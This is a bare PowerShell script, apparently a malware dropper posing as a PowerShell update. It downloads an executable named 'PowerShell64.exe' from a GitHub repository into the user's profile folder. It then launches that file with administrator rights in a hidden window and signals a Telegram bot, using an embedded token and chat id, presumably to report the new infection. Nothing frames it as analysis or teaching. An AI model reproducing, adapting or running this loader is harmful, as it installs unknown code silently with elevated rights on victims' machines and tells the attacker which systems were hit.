$Url = 'https://github.com/37218vuuhuu/updateps1/raw/main/PowerShell64.exe'
[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
$ProgressPreference = 'SilentlyContinue'
$OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'PowerShell64.exe'
Invoke-WebRequest -Uri $Url -OutFile $OutFile
$InstallerPath = $OutFile
$Arguments = '-fullinstall'
$Command = "Start-Process -FilePath '$InstallerPath' -ArgumentList '$Arguments' -Verb RunAs -WindowStyle Hidden"
Invoke-Expression -Command $Command;
$telegramAPI = "https://api.telegram.org/bot5253984892:AAEYJmf0qy9OJjmCo__rrmiSk9t_tFIMvgE/sendMessage?chat_id=683643497&text=x";Invoke-WebRequest -Uri $telegramAPI -Method Post;

